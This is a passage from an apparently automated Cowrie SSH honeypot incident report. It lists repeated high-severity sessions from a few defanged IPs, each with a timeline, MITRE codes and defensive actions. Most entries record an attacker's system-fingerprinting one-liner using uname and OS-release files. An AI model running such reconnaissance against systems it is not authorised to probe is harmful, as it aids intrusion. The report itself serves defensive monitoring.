| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:30:34` | `cowrie.session.connect` |
| `2026-07-09 19:30:34` | `cowrie.client.version` |
| `2026-07-09 19:30:34` | `cowrie.client.kex` |
| `2026-07-09 19:30:37` | `cowrie.login.success` |
| `2026-07-09 19:30:38` | `cowrie.session.params` |
| `2026-07-09 19:30:38` | `cowrie.command.input` |
| `2026-07-09 19:30:38` | `cowrie.command.input` |
| `2026-07-09 19:30:38` | `cowrie.command.input` |
| `2026-07-09 19:30:38` | `cowrie.command.input` |
| `2026-07-09 19:30:38` | `cowrie.command.input` |
| `2026-07-09 19:30:38` | `cowrie.command.success` |
| `2026-07-09 19:30:38` | `cowrie.command.input` |
| `2026-07-09 19:30:38` | `cowrie.command.input` |
| `2026-07-09 19:30:38` | `cowrie.command.input` |
| `2026-07-09 19:30:38` | `cowrie.command.input` |
| `2026-07-09 19:30:39` | `cowrie.log.closed` |
| `2026-07-09 19:30:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0aaa06417223

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:31 |
| **Last Seen** | 2026-07-09 19:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:31:55` | `cowrie.session.connect` |
| `2026-07-09 19:31:55` | `cowrie.client.version` |
| `2026-07-09 19:31:55` | `cowrie.client.kex` |
| `2026-07-09 19:31:57` | `cowrie.login.success` |
| `2026-07-09 19:31:58` | `cowrie.session.params` |
| `2026-07-09 19:31:58` | `cowrie.command.input` |
| `2026-07-09 19:31:58` | `cowrie.command.input` |
| `2026-07-09 19:31:58` | `cowrie.command.input` |
| `2026-07-09 19:31:58` | `cowrie.command.input` |
| `2026-07-09 19:31:58` | `cowrie.command.input` |
| `2026-07-09 19:31:58` | `cowrie.command.success` |
| `2026-07-09 19:31:58` | `cowrie.command.input` |
| `2026-07-09 19:31:58` | `cowrie.command.input` |
| `2026-07-09 19:31:58` | `cowrie.command.input` |
| `2026-07-09 19:31:58` | `cowrie.command.input` |
| `2026-07-09 19:31:58` | `cowrie.log.closed` |
| `2026-07-09 19:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f993ead2227a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:33 |
| **Last Seen** | 2026-07-09 19:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:33:13` | `cowrie.session.connect` |
| `2026-07-09 19:33:13` | `cowrie.client.version` |
| `2026-07-09 19:33:13` | `cowrie.client.kex` |
| `2026-07-09 19:33:15` | `cowrie.login.success` |
| `2026-07-09 19:33:17` | `cowrie.session.params` |
| `2026-07-09 19:33:17` | `cowrie.command.input` |
| `2026-07-09 19:33:17` | `cowrie.command.input` |
| `2026-07-09 19:33:17` | `cowrie.command.input` |
| `2026-07-09 19:33:17` | `cowrie.command.input` |
| `2026-07-09 19:33:17` | `cowrie.command.input` |
| `2026-07-09 19:33:17` | `cowrie.command.success` |
| `2026-07-09 19:33:17` | `cowrie.command.input` |
| `2026-07-09 19:33:17` | `cowrie.command.input` |
| `2026-07-09 19:33:17` | `cowrie.command.input` |
| `2026-07-09 19:33:17` | `cowrie.command.input` |
| `2026-07-09 19:33:17` | `cowrie.log.closed` |
| `2026-07-09 19:33:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ac1c7bef0b2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:34 |
| **Last Seen** | 2026-07-09 19:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:34:31` | `cowrie.session.connect` |
| `2026-07-09 19:34:31` | `cowrie.client.version` |
| `2026-07-09 19:34:31` | `cowrie.client.kex` |
| `2026-07-09 19:34:34` | `cowrie.login.success` |
| `2026-07-09 19:34:35` | `cowrie.session.params` |
| `2026-07-09 19:34:35` | `cowrie.command.input` |
| `2026-07-09 19:34:35` | `cowrie.command.input` |
| `2026-07-09 19:34:35` | `cowrie.command.input` |
| `2026-07-09 19:34:35` | `cowrie.command.input` |
| `2026-07-09 19:34:35` | `cowrie.command.input` |
| `2026-07-09 19:34:35` | `cowrie.command.success` |
| `2026-07-09 19:34:35` | `cowrie.command.input` |
| `2026-07-09 19:34:35` | `cowrie.command.input` |
| `2026-07-09 19:34:35` | `cowrie.command.input` |
| `2026-07-09 19:34:35` | `cowrie.command.input` |
| `2026-07-09 19:34:36` | `cowrie.log.closed` |
| `2026-07-09 19:34:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ccd55dc16f4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:35 |
| **Last Seen** | 2026-07-09 19:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:35:55` | `cowrie.session.connect` |
| `2026-07-09 19:35:55` | `cowrie.client.version` |
| `2026-07-09 19:35:55` | `cowrie.client.kex` |
| `2026-07-09 19:35:57` | `cowrie.login.success` |
| `2026-07-09 19:35:58` | `cowrie.session.params` |
| `2026-07-09 19:35:58` | `cowrie.command.input` |
| `2026-07-09 19:35:58` | `cowrie.command.input` |
| `2026-07-09 19:35:58` | `cowrie.command.input` |
| `2026-07-09 19:35:58` | `cowrie.command.input` |
| `2026-07-09 19:35:58` | `cowrie.command.input` |
| `2026-07-09 19:35:58` | `cowrie.command.success` |
| `2026-07-09 19:35:58` | `cowrie.command.input` |
| `2026-07-09 19:35:58` | `cowrie.command.input` |
| `2026-07-09 19:35:58` | `cowrie.command.input` |
| `2026-07-09 19:35:58` | `cowrie.command.input` |
| `2026-07-09 19:35:59` | `cowrie.log.closed` |
| `2026-07-09 19:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7b4883c0ec2

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-09 19:36 |
| **Last Seen** | 2026-07-09 19:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:36:46` | `cowrie.session.connect` |
| `2026-07-09 19:36:46` | `cowrie.client.version` |
| `2026-07-09 19:36:46` | `cowrie.client.kex` |
| `2026-07-09 19:36:47` | `cowrie.login.success` |
| `2026-07-09 19:36:49` | `cowrie.session.params` |
| `2026-07-09 19:36:49` | `cowrie.command.input` |
| `2026-07-09 19:36:50` | `cowrie.log.closed` |
| `2026-07-09 19:36:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d92a80f7ad16

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:37 |
| **Last Seen** | 2026-07-09 19:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:37:16` | `cowrie.session.connect` |
| `2026-07-09 19:37:16` | `cowrie.client.version` |
| `2026-07-09 19:37:16` | `cowrie.client.kex` |
| `2026-07-09 19:37:18` | `cowrie.login.success` |
| `2026-07-09 19:37:19` | `cowrie.session.params` |
| `2026-07-09 19:37:19` | `cowrie.command.input` |
| `2026-07-09 19:37:19` | `cowrie.command.input` |
| `2026-07-09 19:37:19` | `cowrie.command.input` |
| `2026-07-09 19:37:19` | `cowrie.command.input` |
| `2026-07-09 19:37:19` | `cowrie.command.input` |
| `2026-07-09 19:37:19` | `cowrie.command.success` |
| `2026-07-09 19:37:19` | `cowrie.command.input` |
| `2026-07-09 19:37:19` | `cowrie.command.input` |
| `2026-07-09 19:37:19` | `cowrie.command.input` |
| `2026-07-09 19:37:19` | `cowrie.command.input` |
| `2026-07-09 19:37:20` | `cowrie.log.closed` |
| `2026-07-09 19:37:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a85fcdd49b3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:38 |
| **Last Seen** | 2026-07-09 19:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:38:36` | `cowrie.session.connect` |
| `2026-07-09 19:38:36` | `cowrie.client.version` |
| `2026-07-09 19:38:36` | `cowrie.client.kex` |
| `2026-07-09 19:38:38` | `cowrie.login.success` |
| `2026-07-09 19:38:39` | `cowrie.session.params` |
| `2026-07-09 19:38:39` | `cowrie.command.input` |
| `2026-07-09 19:38:39` | `cowrie.command.input` |
| `2026-07-09 19:38:39` | `cowrie.command.input` |
| `2026-07-09 19:38:39` | `cowrie.command.input` |
| `2026-07-09 19:38:39` | `cowrie.command.input` |
| `2026-07-09 19:38:39` | `cowrie.command.success` |
| `2026-07-09 19:38:39` | `cowrie.command.input` |
| `2026-07-09 19:38:39` | `cowrie.command.input` |
| `2026-07-09 19:38:39` | `cowrie.command.input` |
| `2026-07-09 19:38:39` | `cowrie.command.input` |
| `2026-07-09 19:38:40` | `cowrie.log.closed` |
| `2026-07-09 19:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21d920281fc4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:39 |
| **Last Seen** | 2026-07-09 19:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:39:54` | `cowrie.session.connect` |
| `2026-07-09 19:39:54` | `cowrie.client.version` |
| `2026-07-09 19:39:54` | `cowrie.client.kex` |
| `2026-07-09 19:39:56` | `cowrie.login.success` |
| `2026-07-09 19:39:57` | `cowrie.session.params` |
| `2026-07-09 19:39:57` | `cowrie.command.input` |
| `2026-07-09 19:39:57` | `cowrie.command.input` |
| `2026-07-09 19:39:57` | `cowrie.command.input` |
| `2026-07-09 19:39:57` | `cowrie.command.input` |
| `2026-07-09 19:39:57` | `cowrie.command.input` |
| `2026-07-09 19:39:57` | `cowrie.command.success` |
| `2026-07-09 19:39:57` | `cowrie.command.input` |
| `2026-07-09 19:39:57` | `cowrie.command.input` |
| `2026-07-09 19:39:57` | `cowrie.command.input` |
| `2026-07-09 19:39:57` | `cowrie.command.input` |
| `2026-07-09 19:39:58` | `cowrie.log.closed` |
| `2026-07-09 19:39:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0e795e7386c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 19:41 |
| **Last Seen** | 2026-07-09 19:41 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:41:05` | `cowrie.session.connect` |
| `2026-07-09 19:41:07` | `cowrie.client.version` |
| `2026-07-09 19:41:07` | `cowrie.client.kex` |
| `2026-07-09 19:41:13` | `cowrie.login.success` |
| `2026-07-09 19:41:16` | `cowrie.session.params` |
| `2026-07-09 19:41:16` | `cowrie.command.input` |
| `2026-07-09 19:41:19` | `cowrie.log.closed` |
| `2026-07-09 19:41:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee194b7ecb46

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:41 |
| **Last Seen** | 2026-07-09 19:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:41:11` | `cowrie.session.connect` |
| `2026-07-09 19:41:12` | `cowrie.client.version` |
| `2026-07-09 19:41:12` | `cowrie.client.kex` |
| `2026-07-09 19:41:14` | `cowrie.login.success` |
| `2026-07-09 19:41:15` | `cowrie.session.params` |
| `2026-07-09 19:41:15` | `cowrie.command.input` |
| `2026-07-09 19:41:15` | `cowrie.command.input` |
| `2026-07-09 19:41:15` | `cowrie.command.input` |
| `2026-07-09 19:41:15` | `cowrie.command.input` |
| `2026-07-09 19:41:15` | `cowrie.command.input` |
| `2026-07-09 19:41:15` | `cowrie.command.success` |
| `2026-07-09 19:41:15` | `cowrie.command.input` |
| `2026-07-09 19:41:15` | `cowrie.command.input` |
| `2026-07-09 19:41:15` | `cowrie.command.input` |
| `2026-07-09 19:41:15` | `cowrie.command.input` |
| `2026-07-09 19:41:16` | `cowrie.log.closed` |
| `2026-07-09 19:41:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d8c813e2bf5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:42 |
| **Last Seen** | 2026-07-09 19:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:42:29` | `cowrie.session.connect` |
| `2026-07-09 19:42:29` | `cowrie.client.version` |
| `2026-07-09 19:42:29` | `cowrie.client.kex` |
| `2026-07-09 19:42:31` | `cowrie.login.success` |
| `2026-07-09 19:42:33` | `cowrie.session.params` |
| `2026-07-09 19:42:33` | `cowrie.command.input` |
| `2026-07-09 19:42:33` | `cowrie.command.input` |
| `2026-07-09 19:42:33` | `cowrie.command.input` |
| `2026-07-09 19:42:33` | `cowrie.command.input` |
| `2026-07-09 19:42:33` | `cowrie.command.input` |
| `2026-07-09 19:42:33` | `cowrie.command.success` |
| `2026-07-09 19:42:33` | `cowrie.command.input` |
| `2026-07-09 19:42:33` | `cowrie.command.input` |
| `2026-07-09 19:42:33` | `cowrie.command.input` |
| `2026-07-09 19:42:33` | `cowrie.command.input` |
| `2026-07-09 19:42:33` | `cowrie.log.closed` |
| `2026-07-09 19:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d6cf75f23f2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:43 |
| **Last Seen** | 2026-07-09 19:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:43:44` | `cowrie.session.connect` |
| `2026-07-09 19:43:45` | `cowrie.client.version` |
| `2026-07-09 19:43:45` | `cowrie.client.kex` |
| `2026-07-09 19:43:46` | `cowrie.login.success` |
| `2026-07-09 19:43:48` | `cowrie.session.params` |
| `2026-07-09 19:43:48` | `cowrie.command.input` |
| `2026-07-09 19:43:48` | `cowrie.command.input` |
| `2026-07-09 19:43:48` | `cowrie.command.input` |
| `2026-07-09 19:43:48` | `cowrie.command.input` |
| `2026-07-09 19:43:48` | `cowrie.command.input` |
| `2026-07-09 19:43:48` | `cowrie.command.success` |
| `2026-07-09 19:43:48` | `cowrie.command.input` |
| `2026-07-09 19:43:48` | `cowrie.command.input` |
| `2026-07-09 19:43:48` | `cowrie.command.input` |
| `2026-07-09 19:43:48` | `cowrie.command.input` |
| `2026-07-09 19:43:48` | `cowrie.log.closed` |
| `2026-07-09 19:43:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45c0aa68e8c3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:45 |
| **Last Seen** | 2026-07-09 19:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
